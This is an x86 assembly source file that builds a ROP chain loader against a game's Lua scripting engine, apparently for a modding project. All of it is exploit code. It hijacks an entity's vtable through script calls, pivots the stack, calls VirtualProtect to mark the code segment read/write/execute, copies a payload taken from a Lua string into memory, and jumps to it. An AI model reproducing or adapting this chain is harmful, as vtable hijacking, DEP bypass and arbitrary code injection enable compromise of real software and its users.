%include 'globals.inc'

bits 32
section text
org 0

; ROP loader
; copied onto eObj, 0's are ignored
; full restore using lua

; vtable modification, by Logic.SetEntityScriptingValue(-58, vtable)
; execution by Logic.HeroSetActionPoints(eID, val_for_esi, extra_payload)
; results in call [vtable+40], edi and esi are caller saved!
; 2 args, thiscall, this: CEventValue obj, eax: entity obj ptr, esi: 2nd arg

stage0:         
        dd 402100h          ; fake vtable, HeroSetActionPoints @ [vt+40]
;;[vt+40]: 4020E6h          ; push, push, call esi
;;    esi: 72B479h          ; xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
        dd 40FCB5h          ; add esp, 4 ; ret
        dd 0            ;D eID, do not overwrite!
        dd 58A6CFh          ; push eax ; pop eax ; ret 4
        dd 4215E5h          ; add esp, 0x50 ; ret                   ; space for VirtualProtect
        times 54h db 0                                              ; and other calls
        
        dd 40142Bh          ; pop eax ; ret
        dd virtualProtect
        dd 48A71Bh          ; call [eax] ; ret
        
        dd 401000h      ;D start of segment 
        dd 64B000h      ;D length
        dd 40h          ;D new access: R/W/X
        dd 856A28h      ;D dummy ptr, old permissions
        
        dd 402223h          ; pop ecx ; ret
        dd luaHandle
        dd 6EFC33h          ; mov ecx, dword ptr [ecx] ; (trash eax) ; ret
        dd 40142Bh          ; pop eax ; ret
        dd shok_lua_tostring
        dd 5F521Bh          ; mov dword ptr [esp + 4], ecx ; jmp eax

        
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; ecx = base
        dd 0            ;D dummy, gets overwritten with L <ecx>
        dd 3            ;D lua tostring, arg2 = 3
        
        dd 402480h          ; mov eax, dword ptr [ecx + 4] ; ret        ; eax = size, ecx = base
        dd 5C3F82h          ; pop edx ; ret                             ; edx = memcpy
        dd memcpy       ;D memcpy ptr -> edx        
        dd 42C2F9h          ; mov dword ptr [ecx + 4], edx ; ret        ; [base + 4] = memcpy
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; eax = base, ecx = size
        dd 5FA700h          ; xchg eax, edx ; ret                       ; ecx = size, edx = base
        dd 40142Bh          ; pop eax ; ret                             ; eax = 5d0e34
        dd 5D0E34h      ;D prepare addr, then jmp to _after_ the next instruction        
        dd 5FDABBh          ; mov dword ptr [esp + 0x10], ecx ; jmp eax     ; store memcpy size
        ;; 5D0E34h (eax)    ; mov eax, dword ptr [edx + 4] ; ret            ; eax = memcpy
        dd 5FDC5Eh          ; mov dword ptr [esp + 8], edx ; jmp eax        ; store memcpy src, call memcpy
        
        dd 47179Dh          ; jmp dword ptr [eax]                       ; return addr after memcpy(), eax = base, jmp to [base]
        dd hookBase     ;D memcpy dst
        dd 0            ;D memcpy src
        dd 0            ;D memcpy size